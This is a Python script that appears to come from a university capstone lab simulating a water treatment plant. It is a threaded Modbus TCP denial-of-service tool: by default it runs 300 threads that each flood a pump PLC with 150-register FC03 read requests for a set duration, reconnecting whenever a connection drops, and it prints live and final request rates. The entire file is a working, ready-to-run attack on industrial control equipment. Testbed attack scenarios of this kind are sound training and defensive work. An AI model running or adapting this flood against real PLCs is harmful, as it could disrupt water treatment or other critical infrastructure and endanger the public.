#!/usr/bin/env python3
"""
Goulburn Water Treatment Plant -- Scenario 3: DoS Flood
========================================================
Floods PLC-PUMP1 (plc1) with FC03 Read Holding Registers requests
using a configurable number of threads. Each thread maintains a
persistent connection, fires 150-register reads in a tight loop,
and reconnects automatically on connection error.

A background reporter prints a live counter of requests sent and errors.

Usage:
    python3 scenario3_dos_flood.py [--target 10.0.0.2] [--port 5502]
                                   [--threads 300] [--duration 30]
"""

import argparse
import sys
import threading
import time
from datetime import datetime

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException


# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
def parse_args():
    parser = argparse.ArgumentParser(description="Modbus TCP DoS flood (threaded)")
    parser.add_argument("--target",   default="10.0.0.2", help="Target IP (default: 10.0.0.2)")
    parser.add_argument("--port",     type=int, default=5502,  help="Target port (default: 5502)")
    parser.add_argument("--threads",  type=int, default=300,   help="Flood thread count (default: 300)")
    parser.add_argument("--duration", type=int, default=30,    help="Duration in seconds (default: 30)")
    return parser.parse_args()


# ---------------------------------------------------------------------------
# Shared counters (thread-safe via lock)
# ---------------------------------------------------------------------------
class FloodStats:
    def __init__(self):
        self._lock  = threading.Lock()
        self.sent   = 0
        self.errors = 0

    def record(self, success):
        with self._lock:
            if success:
                self.sent += 1
            else:
                self.errors += 1

    def snapshot(self):
        with self._lock:
            return self.sent, self.errors


# ---------------------------------------------------------------------------
# Flood worker -- one thread per connection
# ---------------------------------------------------------------------------
def flood_worker(target, port, stats, stop_event):
    """Flood target with FC03 reads (150 registers). Reconnect on error."""
    while not stop_event.is_set():
        client = ModbusTcpClient(target, port=port)
        try:
            if client.connect():
                # Inner loop: keep firing until error or stop
                while not stop_event.is_set():
                    try:
                        r = client.read_holding_registers(30000, count=150, device_id=1)
                        stats.record(not r.isError())
                    except Exception:
                        stats.record(False)
                        break   # reconnect
            else:
                stats.record(False)
        except Exception:
            stats.record(False)
        finally:
            try:
                client.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# Live counter reporter
# ---------------------------------------------------------------------------
def reporter(stats, stop_event, start_time, interval=2.0):
    """Print live request and error counts every `interval` seconds."""
    last_sent = 0
    while not stop_event.is_set():
        time.sleep(interval)
        sent, errors = stats.snapshot()
        elapsed = time.time() - start_time
        delta = sent - last_sent
        rps = delta / interval
        last_sent = sent
        print(
            f"  [{elapsed:>5.1f}s]  Sent: {sent:>8}  "
            f"Rate: {rps:>7.0f} req/s  Errors: {errors}",
            flush=True,
        )


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    args = parse_args()

    print("=" * 66)
    print("  Goulburn WTP -- Scenario 3: DoS Flood")
    print("  AquaOps Utilities | 31261 Internetworking Capstone (UTS)")
    print(f"  Target : {args.target}:{args.port}")
    print(f"  Threads: {args.threads}  |  Duration: {args.duration}s")
    print(f"  Start  : {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 66)
    print(f"  Launching {args.threads} flood threads (FC03, 150 regs each) ...\n")

    stats      = FloodStats()
    stop_event = threading.Event()
    start_time = time.time()

    # Start flood threads
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(
            target=flood_worker,
            args=(args.target, args.port, stats, stop_event),
            daemon=True,
        )
        t.start()
        threads.append(t)

    # Start live reporter thread
    rep = threading.Thread(
        target=reporter,
        args=(stats, stop_event, start_time),
        daemon=True,
    )
    rep.start()

    # Run for the specified duration
    time.sleep(args.duration)
    stop_event.set()

    # Brief wait for threads to exit (daemon, so process won't hang)
    for t in threads:
        t.join(timeout=2.0)

    # -----------------------------------------------------------------------
    # Final report
    # -----------------------------------------------------------------------
    total_time = time.time() - start_time
    sent, errors = stats.snapshot()
    avg_rps = sent / total_time if total_time > 0 else 0

    print("\n" + "=" * 66)
    print("  FINAL RESULTS")
    print("=" * 66)
    print(f"  Duration              : {total_time:.1f}s")
    print(f"  Threads used          : {args.threads}")
    print(f"  Total requests sent   : {sent}")
    print(f"  Errors                : {errors}")
    print(f"  Average rate          : {avg_rps:.0f} req/s")
    print(f"  Registers per request : 150 (HR 30000-30149)")
    print("=" * 66)
    print(f"  End: {datetime.now().strftime('%Y-%m-%dT%H:%M:%S')}")
    print("=" * 66)


if __name__ == "__main__":
    main()
